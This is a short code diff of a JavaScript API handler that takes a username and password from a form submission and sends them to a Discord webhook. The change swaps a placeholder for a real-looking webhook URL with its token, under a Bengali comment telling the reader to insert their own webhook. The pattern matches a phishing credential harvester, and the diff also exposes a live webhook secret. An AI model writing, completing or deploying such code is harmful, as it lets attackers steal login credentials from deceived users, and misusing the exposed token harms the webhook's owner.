@@ -4,7 +4,7 @@ export default async function handler(req, res) {
   }
 
   const { username, password } = req.body;
-  const webhookUrl = 'https://discord.com/api/webhooks/XXXX/YYYY'; // এখানে তোমার webhook বসাও
+  const webhookUrl = 'https://discord.com/api/webhooks/1574410099294732320/yVIpbgS7Zz1WJpP6PPuZiG_gB796XDrJAgpqri6DoPJkcEsS9HocqYmBoqK_a31101pB'; // এখানে তোমার webhook বসাও
 
   try {
     const response = await fetch(webhookUrl, {
